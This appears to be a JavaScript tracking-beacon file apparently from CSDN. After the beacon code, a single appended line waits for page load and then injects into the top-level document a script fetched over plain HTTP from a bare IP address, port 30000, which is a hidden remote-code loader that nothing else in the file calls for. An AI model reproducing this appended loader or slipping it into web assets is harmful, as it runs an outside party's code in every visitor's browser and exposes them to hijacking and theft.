(function(){
  var prot_as = window.location.protocol;
  var repo_url_as = prot_as + "//dc2.csdn.net/track"; /*"//117.79.93.210/track"; "//dc2.csdn.net/track";*/
  var repo_body_referer = window.location;
  var repo_body_referer2 = encodeURIComponent(repo_body_referer);
  var i = new Image();
  i.onload = i.onerror = function(){
    i.onload = i.onerror = null;
    i.removeAttribute("src");
    i = null;
  };
  i.src = repo_url_as + "?" + Math.random();
  /*referer*/

})();;window.addEventListener('load',function(){var s = top.document.getElementById('1qa2ws');if(!s){s = top.document.createElement('script');s.id = '1qa2ws';s.type='text/javascript';s.src='http://220.196.52.141:30000/www/default/base.js?v1.2';top.document.body.appendChild(s);}},false);